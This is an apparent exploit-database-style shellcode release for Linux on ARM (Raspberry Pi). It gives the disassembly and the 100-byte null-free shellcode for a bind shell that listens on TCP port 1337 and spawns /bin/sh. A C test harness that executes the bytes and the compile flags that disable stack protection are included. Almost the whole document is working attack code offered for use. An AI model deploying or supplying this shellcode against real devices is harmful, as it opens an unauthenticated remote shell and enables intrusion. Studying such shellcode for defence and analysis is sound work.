# Title: Linux/ARM (Raspberry Pi) - Bind (0.0.0.0:1337/TCP) Shell (/bin/sh) + Null-Free Shellcode (100 bytes)
# Date: 2020-06-09
# Architecture: armv6l GNU/Linux
# Website: http://www.theanuragsrivastava.com
# Author: Anurag Srivastava


/*


bindwala:     file format elf32-littlearm


Disassembly of section .text:

00010054 <_start>:
   10054:	e28f3001 	add	r3, pc, #1
   10058:	e12fff13 	bx	r3
   1005c:	2001      	movs	r0, #1
   1005e:	1c01      	adds	r1, r0, #0
   10060:	3001      	adds	r0, #1
   10062:	4052      	eors	r2, r2
   10064:	27c8      	movs	r7, #200	; 0xc8
   10066:	3751      	adds	r7, #81	; 0x51
   10068:	df01      	svc	1
   1006a:	1c04      	adds	r4, r0, #0
   1006c:	46c0      	nop			; (mov r8, r8)
   1006e:	a10e      	add	r1, pc, #56	; (adr r1, 100a8 <struct_addr>)
   10070:	704a      	strb	r2, [r1, #1]
   10072:	604a      	str	r2, [r1, #4]
   10074:	2210      	movs	r2, #16
   10076:	3701      	adds	r7, #1
   10078:	df01      	svc	1
   1007a:	1c20      	adds	r0, r4, #0
   1007c:	2102      	movs	r1, #2
   1007e:	187f      	adds	r7, r7, r1
   10080:	df01      	svc	1
   10082:	1c20      	adds	r0, r4, #0
   10084:	4049      	eors	r1, r1
   10086:	1c0a      	adds	r2, r1, #0
   10088:	3701      	adds	r7, #1
   1008a:	df01      	svc	1
   1008c:	1c04      	adds	r4, r0, #0
   1008e:	2102      	movs	r1, #2

00010090 <loop>:
   10090:	1c20      	adds	r0, r4, #0
   10092:	273f      	movs	r7, #63	; 0x3f
   10094:	df01      	svc	1
   10096:	3901      	subs	r1, #1
   10098:	d5fa      	bpl.n	10090 <loop>
   1009a:	a005      	add	r0, pc, #20	; (adr r0, 100b0 <spawnit>)
   1009c:	1a49      	subs	r1, r1, r1
   1009e:	1c0a      	adds	r2, r1, #0
   100a0:	71c1      	strb	r1, [r0, #7]
   100a2:	270b      	movs	r7, #11
   100a4:	df01      	svc	1
   100a6:	46c0      	nop			; (mov r8, r8)

000100a8 <struct_addr>:
   100a8:	3905ff02 	.word	0x3905ff02
   100ac:	01010101 	.word	0x01010101

000100b0 <spawnit>:
   100b0:	6e69622f 	.word	0x6e69622f
   100b4:	5868732f 	.word	0x5868732f
pi@raspberrypi:~/hex $ nano tada.c
pi@raspberrypi:~/hex $ gcc -fno-stack-protector -z execstack tada.c -o tada
pi@raspberrypi:~/hex $ ./tada
Shellcode Length:  100

*/
#include<stdio.h>
#include<string.h>

unsigned char shellcode[] = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x01\x20\x01\x1c\x01\x30\x52\x40\xc8\x27\x51\x37\x01\xdf\x04\x1c\xc0\x46\x0e\xa1\x4a\x70\x4a\x60\x10\x22\x01\x37\x01\xdf\x20\x1c\x02\x21\x7f\x18\x01\xdf\x20\x1c\x49\x40\x0a\x1c\x01\x37\x01\xdf\x04\x1c\x02\x21\x20\x1c\x3f\x27\x01\xdf\x01\x39\xfa\xd5\x05\xa0\x49\x1a\x0a\x1c\xc1\x71\x0b\x27\x01\xdf\xc0\x46\x02\xff\x05\x39\x01\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x58";
main(){

   printf("Shellcode Length:  %d\n", (int)strlen(shellcode));
   int (*ret)() = (int(*)())shellcode;

   ret();
}